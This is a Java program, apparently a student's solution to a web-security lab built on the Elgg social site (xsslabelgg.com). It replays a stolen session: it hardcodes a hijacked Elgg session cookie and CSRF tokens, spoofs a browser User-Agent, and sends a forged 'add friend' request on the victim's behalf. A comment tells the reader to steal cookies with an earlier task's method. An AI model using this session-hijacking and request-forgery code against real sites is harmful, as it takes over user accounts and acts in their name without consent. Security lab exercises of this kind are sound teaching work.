import java.io.*;
import java.net.*;

public class Friend {

    public static void main(String[] args) throws IOException {
        
    try {
            int responseCode;
            InputStream responseIn=null;
            // String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";
            String requestDetails = "&__elgg_ts=1495814312&__elgg_token=27c7a1aaead4f559385e3f869c7565c4";

            // URL to be forged.
            // URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
            URL url = new URL ("http://www.xsslabelgg.com/action/friends/add?friend=42"+requestDetails);

            // URLConnection instance is created to further parameterize a
            // resource request past what the state members of URL instance
            // can represent.
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            if (urlConn instanceof HttpURLConnection) {
                urlConn.setConnectTimeout(60000);
                urlConn.setReadTimeout(90000);
            }

            // addRequestProperty method is used to add HTTP Header Information.
            // Here we add User-Agent HTTP header to the forged HTTP packet.
            // Add other necessary HTTP Headers yourself. Cookies should be stolen
            // using the method in task3.
            // urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
            // urlConn.addRequestProperty("Host","www.xsslabelgg.com");
            urlConn.addRequestProperty("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0");
            urlConn.addRequestProperty("Cookie", "Elgg=a81t2vapro8jm6lch00vk8gtf1");
            // urlConn.addRequestProperty("Accept-Language","en-US,en;q=0.5");
            // urlConn.addRequestProperty("Accept-Encoding","gzip, deflate");
            // urlConn.addRequestProperty("Connection", "keep-alive");

            //HTTP Post Data which includes the information to be sent to the server.
            // String data = "name=...&guid=..";
            String data = "name=marge&guid=42";

            // DoOutput flag of URL Connection should be set to true
            // to send HTTP POST message.
            urlConn.setDoOutput(true);

            // OutputStreamWriter is used to write the HTTP POST data
            // to the url connection.
            OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
            wr.write(data);
            wr.flush();

            // HttpURLConnection a subclass of URLConnection is returned by
            // url.openConnection() since the url is an http request.
            if (urlConn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) urlConn;

                // Contacts the web server and gets the status code from
                // HTTP Response message.
                responseCode = httpConn.getResponseCode();
                System.out.println("Response Code = " + responseCode);

                // HTTP status code HTTP_OK means the response was
                // received sucessfully.
                if (responseCode == HttpURLConnection.HTTP_OK)
                    // Get the input stream from url connection object.
                    responseIn = urlConn.getInputStream();

                // Create an instance for BufferedReader
                // to read the response line by line.
                BufferedReader buf_inp = new BufferedReader(new InputStreamReader(responseIn));
                String inputLine;

                while((inputLine = buf_inp.readLine())!=null) {
                    // debug
                    System.out.println(inputLine);
                }
            }

        } catch (MalformedURLException e) {
            e.printStackTrace();
        }

    }

}
